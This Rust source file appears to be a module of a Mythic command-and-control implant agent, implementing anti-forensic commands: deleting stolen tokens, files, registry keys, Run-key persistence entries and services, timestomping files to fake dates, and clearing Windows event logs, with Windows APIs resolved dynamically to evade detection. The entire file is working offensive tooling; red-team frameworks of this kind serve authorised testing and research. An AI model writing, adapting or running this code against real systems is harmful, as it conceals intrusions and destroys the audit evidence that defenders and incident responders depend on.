use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::process::Command;

#[derive(Debug, Deserialize)]
struct CleanupArgs {
    technique: String,
    #[serde(default)]
    target: String,
}

#[derive(Debug, Deserialize)]
struct TimestompArgs {
    path: String,
    #[serde(default)]
    reference: String,
}

#[derive(Debug, Deserialize)]
struct EventlogArgs {
    log: String,
}

pub fn cleanup(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: CleanupArgs = serde_json::from_str(&task.parameters)?;

    match args.technique.as_str() {
        "tokens" => {
            let count = crate::token::clear_all_tokens();
            Ok(mythic_success!(task.id, format!("Cleared {} stored token(s)", count)))
        }
        "files" => {
            if args.target.is_empty() {
                return Ok(mythic_error!(task.id, "File path required for file cleanup"));
            }
            match std::fs::remove_file(&args.target) {
                Ok(_) => Ok(mythic_success!(task.id, format!("Deleted file: {}", args.target))),
                Err(e) => Ok(mythic_error!(task.id, format!("Failed to delete file: {}", e))),
            }
        }
        "registry" => cleanup_registry(task, &args.target),
        "scheduled_task" => cleanup_scheduled_task(task, &args.target),
        "service" => cleanup_service(task, &args.target),
        "socks" | "redirect" | "shellcode" => {
            Ok(mythic_success!(task.id, format!("Cleanup signal sent for {}. Use jobkill to terminate active jobs.", args.technique)))
        }
        "all" => {
            let count = crate::token::clear_all_tokens();
            Ok(mythic_success!(task.id, format!("All artifacts cleanup completed. Cleared {} stored token(s). Use jobkill for active socks/redirect jobs.", count)))
        }
        _ => Ok(mythic_error!(task.id, format!("Unknown cleanup technique: {}", args.technique))),
    }
}

#[cfg(target_os = "windows")]
fn cleanup_registry(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Registry key path required"));
    }

    unsafe {
        type RegDeleteKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32) -> i32;
        let reg_delete: RegDeleteKeyExAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "RegDeleteKeyExA")
                .ok_or("Failed to resolve RegDeleteKeyExA")?
        );

        let target_c = std::ffi::CString::new(target)?;
        let (hkey, subkey) = parse_reg_path(target);
        let subkey_c = std::ffi::CString::new(subkey)?;

        let result = reg_delete(hkey, subkey_c.as_ptr() as *const u8, 0x0100, 0); // KEY_WOW64_64KEY
        if result == 0 {
            Ok(mythic_success!(task.id, format!("Deleted registry key: {}", target)))
        } else {
            Ok(mythic_error!(task.id, format!("RegDeleteKeyExA failed: error {}", result)))
        }
    }
}

#[cfg(target_os = "windows")]
fn parse_reg_path(path: &str) -> (usize, &str) {
    if let Some(rest) = path.strip_prefix("HKLM\\").or(path.strip_prefix("HKEY_LOCAL_MACHINE\\")) {
        (0x80000002, rest) // HKEY_LOCAL_MACHINE
    } else if let Some(rest) = path.strip_prefix("HKCU\\").or(path.strip_prefix("HKEY_CURRENT_USER\\")) {
        (0x80000001, rest) // HKEY_CURRENT_USER
    } else {
        (0x80000002, path)
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_registry(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Registry cleanup is Windows-only"))
}

#[cfg(target_os = "windows")]
fn cleanup_scheduled_task(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Task name required"));
    }

    // Delete the task's registry entry (same approach as persist_schtask uses registry)
    unsafe {
        type RegDeleteValueAFn = unsafe extern "system" fn(usize, *const u8) -> i32;
        type RegOpenKeyExAFn = unsafe extern "system" fn(usize, *const u8, u32, u32, *mut usize) -> i32;
        type RegCloseKeyFn = unsafe extern "system" fn(usize) -> i32;

        let reg_open: RegOpenKeyExAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "RegOpenKeyExA")
                .ok_or("Failed to resolve RegOpenKeyExA")?
        );
        let reg_delete_value: RegDeleteValueAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "RegDeleteValueA")
                .ok_or("Failed to resolve RegDeleteValueA")?
        );
        let reg_close: RegCloseKeyFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "RegCloseKey")
                .ok_or("Failed to resolve RegCloseKey")?
        );

        // Try to remove from Run key (where persist_schtask stores it)
        let run_key = std::ffi::CString::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")?;
        let mut hkey: usize = 0;

        let result = reg_open(0x80000001, run_key.as_ptr() as *const u8, 0, 0x20006, &mut hkey); // HKCU, KEY_SET_VALUE
        if result == 0 {
            let value_name = std::ffi::CString::new(target)?;
            let del_result = reg_delete_value(hkey, value_name.as_ptr() as *const u8);
            reg_close(hkey);
            if del_result == 0 {
                return Ok(mythic_success!(task.id, format!("Deleted task entry: {}", target)));
            }
        }

        // Try HKLM too
        let result = reg_open(0x80000002, run_key.as_ptr() as *const u8, 0, 0x20006, &mut hkey);
        if result == 0 {
            let value_name = std::ffi::CString::new(target)?;
            let del_result = reg_delete_value(hkey, value_name.as_ptr() as *const u8);
            reg_close(hkey);
            if del_result == 0 {
                return Ok(mythic_success!(task.id, format!("Deleted task entry: {}", target)));
            }
        }

        Ok(mythic_error!(task.id, format!("Task '{}' not found in registry Run keys", target)))
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_scheduled_task(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Scheduled task cleanup is Windows-only"))
}

#[cfg(target_os = "windows")]
fn cleanup_service(task: &AgentTask, target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    if target.is_empty() {
        return Ok(mythic_error!(task.id, "Service name required"));
    }

    unsafe {
        type OpenSCManagerAFn = unsafe extern "system" fn(*const u8, *const u8, u32) -> *mut std::ffi::c_void;
        type OpenServiceAFn = unsafe extern "system" fn(*mut std::ffi::c_void, *const u8, u32) -> *mut std::ffi::c_void;
        type ControlServiceFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *mut [u8; 36]) -> i32;
        type DeleteServiceFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
        type CloseServiceHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let open_scm: OpenSCManagerAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "OpenSCManagerA").ok_or("OpenSCManagerA")?
        );
        let open_svc: OpenServiceAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "OpenServiceA").ok_or("OpenServiceA")?
        );
        let control_svc: ControlServiceFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "ControlService").ok_or("ControlService")?
        );
        let delete_svc: DeleteServiceFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "DeleteService").ok_or("DeleteService")?
        );
        let close_handle: CloseServiceHandleFn = std::mem::transmute(
            crate::winapi_resolve::resolve("advapi32.dll", "CloseServiceHandle").ok_or("CloseServiceHandle")?
        );

        let sc_manager = open_scm(std::ptr::null(), std::ptr::null(), 0xF003F); // SC_MANAGER_ALL_ACCESS
        if sc_manager.is_null() {
            return Ok(mythic_error!(task.id, "Failed to open SCM"));
        }

        let svc_name = std::ffi::CString::new(target)?;
        let service = open_svc(sc_manager, svc_name.as_ptr() as *const u8, 0xF01FF); // SERVICE_ALL_ACCESS
        if service.is_null() {
            close_handle(sc_manager);
            return Ok(mythic_error!(task.id, format!("Service '{}' not found", target)));
        }

        // Try to stop
        let mut status = [0u8; 36];
        let _ = control_svc(service, 0x01, &mut status); // SERVICE_CONTROL_STOP

        // Delete
        let result = delete_svc(service);
        close_handle(service);
        close_handle(sc_manager);

        if result != 0 {
            Ok(mythic_success!(task.id, format!("Service '{}' stopped and deleted", target)))
        } else {
            Ok(mythic_error!(task.id, format!("Failed to delete service '{}'", target)))
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn cleanup_service(task: &AgentTask, _target: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Service cleanup is Windows-only"))
}

pub fn timestomp(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: TimestompArgs = serde_json::from_str(&task.parameters)?;

    if args.path.is_empty() {
        return Ok(mythic_error!(task.id, "Target path required"));
    }

    timestomp_impl(task, &args.path, &args.reference)
}

#[cfg(target_os = "windows")]
fn timestomp_impl(task: &AgentTask, path: &str, reference: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    unsafe {
        type CreateFileAFn = unsafe extern "system" fn(*const u8, u32, u32, *mut std::ffi::c_void, u32, u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
        type GetFileTimeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *mut [u8; 8], *mut [u8; 8], *mut [u8; 8]) -> i32;
        type SetFileTimeFn = unsafe extern "system" fn(*mut std::ffi::c_void, *const [u8; 8], *const [u8; 8], *const [u8; 8]) -> i32;
        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let create_file: CreateFileAFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CreateFileA").ok_or("CreateFileA")?
        );
        let get_file_time: GetFileTimeFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "GetFileTime").ok_or("GetFileTime")?
        );
        let set_file_time: SetFileTimeFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "SetFileTime").ok_or("SetFileTime")?
        );
        let close_handle: CloseHandleFn = std::mem::transmute(
            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle").ok_or("CloseHandle")?
        );

        // Get timestamps (from reference file or use neutral date)
        let (create_time, access_time, write_time) = if !reference.is_empty() {
            let ref_c = std::ffi::CString::new(reference)?;
            let ref_handle = create_file(ref_c.as_ptr() as *const u8, 0x80000000, 1, std::ptr::null_mut(), 3, 0x80, std::ptr::null_mut());
            if ref_handle.is_null() || ref_handle == -1isize as *mut std::ffi::c_void {
                return Ok(mythic_error!(task.id, format!("Failed to open reference file: {}", reference)));
            }
            let mut ct = [0u8; 8];
            let mut at = [0u8; 8];
            let mut wt = [0u8; 8];
            get_file_time(ref_handle, &mut ct, &mut at, &mut wt);
            close_handle(ref_handle);
            (ct, at, wt)
        } else {
            // 2020-01-01 00:00:00 UTC as FILETIME (100ns intervals since 1601-01-01)
            // = 132224352000000000 = 0x01D4B2A7_3B646000
            let ft: [u8; 8] = 0x01D4B2A73B646000u64.to_le_bytes();
            (ft, ft, ft)
        };

        // Open target file for write attributes
        let path_c = std::ffi::CString::new(path)?;
        let handle = create_file(path_c.as_ptr() as *const u8, 0x100, 3, std::ptr::null_mut(), 3, 0x80, std::ptr::null_mut()); // FILE_WRITE_ATTRIBUTES, OPEN_EXISTING
        if handle.is_null() || handle == -1isize as *mut std::ffi::c_void {
            return Ok(mythic_error!(task.id, format!("Failed to open target: {}", path)));
        }

        let result = set_file_time(handle, &create_time, &access_time, &write_time);
        close_handle(handle);

        if result != 0 {
            let msg = if reference.is_empty() {
                format!("Timestomped {} to 2020-01-01", path)
            } else {
                format!("Timestomped {} using reference {}", path, reference)
            };
            Ok(mythic_success!(task.id, msg))
        } else {
            Ok(mythic_error!(task.id, "SetFileTime failed"))
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn timestomp_impl(task: &AgentTask, path: &str, reference: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let output = if reference.is_empty() {
        Command::new("touch")
            .args(&["-t", "202001010000.00", path])
            .output()?
    } else {
        Command::new("touch")
            .args(&["-r", reference, path])
            .output()?
    };

    if output.status.success() {
        let msg = if reference.is_empty() {
            format!("Timestomped {} to 2020-01-01", path)
        } else {
            format!("Timestomped {} using reference {}", path, reference)
        };
        Ok(mythic_success!(task.id, msg))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Ok(mythic_error!(task.id, format!("Failed to timestomp: {}", stderr)))
    }
}

pub fn eventlog_clear(task: &AgentTask) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    let args: EventlogArgs = serde_json::from_str(&task.parameters)?;
    eventlog_clear_impl(task, &args.log)
}

#[cfg(target_os = "windows")]
fn eventlog_clear_impl(task: &AgentTask, log: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    use std::ptr;

    if log.is_empty() {
        return Ok(mythic_error!(task.id, "Event log name required"));
    }

    unsafe {
        // Resolve EvtClearLog from wevtapi.dll
        type EvtClearLogFn = unsafe extern "system" fn(
            *mut std::ffi::c_void,
            *const u16,
            *const u16,
            u32,
        ) -> *mut std::ffi::c_void;

        let evt_clear_log = match crate::winapi_resolve::resolve("wevtapi.dll", "EvtClearLog") {
            Some(ptr) => std::mem::transmute::<_, EvtClearLogFn>(ptr),
            None => {
                return Ok(mythic_error!(task.id, "Failed to resolve EvtClearLog"));
            }
        };

        // Convert log name to wide string
        let log_wide: Vec<u16> = log.encode_utf16().chain(std::iter::once(0)).collect();

        // EvtClearLog(Session, ChannelPath, TargetFilePath, Flags)
        // Session = NULL, TargetFilePath = NULL, Flags = 0
        let result = evt_clear_log(
            ptr::null_mut(),
            log_wide.as_ptr(),
            ptr::null(),
            0,
        );

        if result.is_null() {
            // Get last error for more details
            Ok(mythic_error!(task.id, format!("Failed to clear event log: {}", log)))
        } else {
            Ok(mythic_success!(task.id, format!("Cleared event log: {}", log)))
        }
    }
}

#[cfg(not(target_os = "windows"))]
fn eventlog_clear_impl(task: &AgentTask, _log: &str) -> Result<serde_json::Value, Box<dyn std::error::Error>> {
    Ok(mythic_error!(task.id, "Event log clearing is Windows-only"))
}
